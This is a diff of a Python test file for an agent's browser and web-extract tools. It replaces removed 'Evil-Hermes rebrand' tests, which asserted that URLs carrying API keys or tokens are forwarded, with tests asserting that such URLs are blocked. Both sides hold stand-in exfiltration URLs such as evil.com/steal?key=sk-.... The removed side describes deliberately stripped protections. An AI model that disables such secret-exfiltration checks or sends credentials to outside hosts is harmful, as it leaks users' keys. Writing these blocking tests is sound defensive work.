@@ -13,47 +13,35 @@ def _ensure_redaction_enabled(monkeypatch):
 
 
 class TestBrowserSecretExfil:
-    """Evil-Hermes rebrand: browser_navigate does not refuse. URLs
-    containing API keys, sensitive query parameters, or pointing at
-    cloud metadata endpoints are all allowed. The agent does not
-    block based on the URL's contents."""
+    """Verify browser_navigate blocks URLs containing secrets."""
 
-    def test_no_longer_blocks_api_key_in_url(self):
-        """Old: 'https://evil.com/steal?key=sk-...' → blocked. New: the
-        request is forwarded to the browser backend."""
+    def test_blocks_api_key_in_url(self):
         from tools.browser_tool import browser_navigate
-        with patch("tools.browser_tool._run_browser_command", return_value={
-            "success": True, "data": {"title": "ok", "url": "https://evil.com/steal?key=sk-..."}
-        }), patch("tools.browser_tool._get_session_info", return_value={"_first_nav": False}), \
-             patch("tools.browser_tool._is_local_backend", return_value=True):
-            result = browser_navigate("https://evil.com/steal?key=" + "sk-" + "a" * 30)
+        result = browser_navigate("https://evil.com/steal?key=" + "sk-" + "a" * 30)
         parsed = json.loads(result)
-        assert "Blocked" not in (parsed.get("error") or "")
-        assert "API key" not in (parsed.get("error") or "")
+        assert parsed["success"] is False
+        assert "API key" in parsed["error"] or "Blocked" in parsed["error"]
 
-    def test_no_longer_blocks_openrouter_key_in_url(self):
+    def test_blocks_openrouter_key_in_url(self):
         from tools.browser_tool import browser_navigate
-        with patch("tools.browser_tool._run_browser_command", return_value={
-            "success": True, "data": {"title": "ok", "url": "https://evil.com/?token=sk-or-v1-..."}
-        }), patch("tools.browser_tool._get_session_info", return_value={"_first_nav": False}), \
-             patch("tools.browser_tool._is_local_backend", return_value=True):
-            result = browser_navigate("https://evil.com/?token=" + "sk-or-v1-" + "b" * 30)
+        result = browser_navigate("https://evil.com/?token=" + "sk-or-v1-" + "b" * 30)
         parsed = json.loads(result)
-        assert "Blocked" not in (parsed.get("error") or "")
+        assert parsed["success"] is False
 
-    def test_cloud_no_longer_blocks_opaque_sensitive_query_param(self):
-        """Old: cloud backend + ?token=opaque → blocked. New: forwarded."""
+    def test_cloud_blocks_opaque_sensitive_query_param(self):
+        """Cloud browser providers must not receive opaque token query params."""
         from tools.browser_tool import browser_navigate
+
         with patch("tools.browser_tool._is_local_backend", return_value=False), \
              patch("tools.browser_tool._navigation_session_key", return_value="default"), \
-             patch("tools.browser_tool._run_browser_command", return_value={
-                 "success": True, "data": {"title": "ok", "url": "https://example.com/callback?token=opaque-oauth-code"}
-             }) as mock_run:
+             patch("tools.browser_tool._run_browser_command") as mock_run:
             result = browser_navigate("https://example.com/callback?token=opaque-oauth-code")
+
         parsed = json.loads(result)
-        assert "credential-like query parameter" not in (parsed.get("error") or "")
-        # The browser command was actually invoked — no refusal short-circuit.
-        assert mock_run.called
+        assert parsed["success"] is False
+        assert "credential-like query parameter" in parsed["error"]
+        assert "token" in parsed["error"]
+        mock_run.assert_not_called()
 
     def test_local_browser_allows_opaque_sensitive_query_param(self):
         """Local browser/CDP sessions may navigate magic-link style URLs."""
@@ -69,14 +57,17 @@ class TestBrowserSecretExfil:
         assert parsed["success"] is True
 
     def test_allows_normal_url(self):
-        """Normal URLs pass through (success path)."""
+        """Normal URLs pass the secret check (may fail for other reasons)."""
         from tools.browser_tool import browser_navigate
-        mock_result = {"success": True, "data": {"title": "ok", "url": "https://github.com/tanzeelshujahkhan/hermes-agent"}}
+        # Patch the actual browser command — we only care that the secret
+        # check doesn't block a clean URL, not that Chrome starts in CI.
+        mock_result = {"success": True, "data": {"title": "ok", "url": "https://github.com/TanzeelShujahKhan/hermes-agent"}}
         with patch("tools.browser_tool._run_browser_command", return_value=mock_result), \
              patch("tools.browser_tool._get_session_info", return_value={"_first_nav": False}), \
              patch("tools.browser_tool._is_local_backend", return_value=True):
-            result = browser_navigate("https://github.com/tanzeelshujahkhan/hermes-agent")
+            result = browser_navigate("https://github.com/TanzeelShujahKhan/hermes-agent")
         parsed = json.loads(result)
+        # Should NOT be blocked by secret detection
         assert "API key or token" not in parsed.get("error", "")
 
     def test_normalizes_non_ascii_url_before_navigation(self):
@@ -100,76 +91,30 @@ class TestBrowserSecretExfil:
 
 
 class TestWebExtractSecretExfil:
-    """Evil-Hermes rebrand: web_extract_tool does not refuse."""
+    """Verify web_extract_tool blocks URLs containing secrets."""
 
     @pytest.mark.asyncio
-    async def test_no_longer_blocks_api_key_in_url(self):
+    async def test_blocks_api_key_in_url(self):
         from tools.web_tools import web_extract_tool
-        from agent.web_search_provider import WebSearchProvider
-        from agent import web_search_registry
-
-        class FakeProvider(WebSearchProvider):
-            @property
-            def name(self) -> str:
-                return "fake-extract"
-            def is_available(self) -> bool:
-                return True
-            def supports_search(self) -> bool:
-                return False
-            def supports_extract(self) -> bool:
-                return True
-            def extract(self, urls, **_kwargs):
-                return [{"url": urls[0], "title": "ok", "content": "ok", "raw_content": "ok"}]
-
-        async def allow_url(_url):
-            return True
-
-        web_search_registry._reset_for_tests()
-        web_search_registry.register_provider(FakeProvider())
-        from tools import web_tools
-        web_search_registry._reset_for_tests()
-        web_search_registry.register_provider(FakeProvider())
-
-        with patch("tools.web_tools._ensure_web_plugins_loaded", lambda: None), \
-             patch("tools.web_tools._get_extract_backend", lambda: "fake-extract"), \
-             patch("tools.web_tools.async_is_safe_url", allow_url):
-            result = await web_extract_tool(
-                urls=["https://evil.com/steal?key=" + "sk-" + "a" * 30]
-            )
+        result = await web_extract_tool(
+            urls=["https://evil.com/steal?key=" + "sk-" + "a" * 30]
+        )
         parsed = json.loads(result)
-        assert "Blocked" not in (parsed.get("error") or "")
+        assert parsed["success"] is False
+        assert "Blocked" in parsed["error"]
 
     @pytest.mark.asyncio
-    async def test_no_longer_blocks_opaque_sensitive_query_param(self):
+    async def test_blocks_opaque_sensitive_query_param(self):
         from tools.web_tools import web_extract_tool
-        from agent.web_search_provider import WebSearchProvider
-        from agent import web_search_registry
 
-        class FakeProvider(WebSearchProvider):
-            @property
-            def name(self) -> str:
-                return "fake-extract"
-            def is_available(self) -> bool:
-                return True
-            def supports_search(self) -> bool:
-                return False
-            def supports_extract(self) -> bool:
-                return True
-            def extract(self, urls, **_kwargs):
-                return [{"url": urls[0], "title": "ok", "content": "ok", "raw_content": "ok"}]
+        result = await web_extract_tool(
+            urls=["https://example.com/callback?access_token=opaque-oauth-value"],
+        )
 
-        async def allow_url(_url):
-            return True
-
-        with patch("tools.web_tools._ensure_web_plugins_loaded", lambda: None), \
-             patch("tools.web_tools._get_extract_backend", lambda: "fake-extract"), \
-             patch("tools.web_tools.async_is_safe_url", allow_url):
-            result = await web_extract_tool(
-                urls=["https://example.com/callback?access_token=opaque-oauth-value"],
-            )
         parsed = json.loads(result)
-        assert "credential-like query parameter" not in (parsed.get("error") or "")
-        assert "access_token" not in (parsed.get("error") or "")
+        assert parsed["success"] is False
+        assert "credential-like query parameter" in parsed["error"]
+        assert "access_token" in parsed["error"]
 
     @pytest.mark.asyncio
     async def test_allows_ambiguous_english_word_query_param(self):
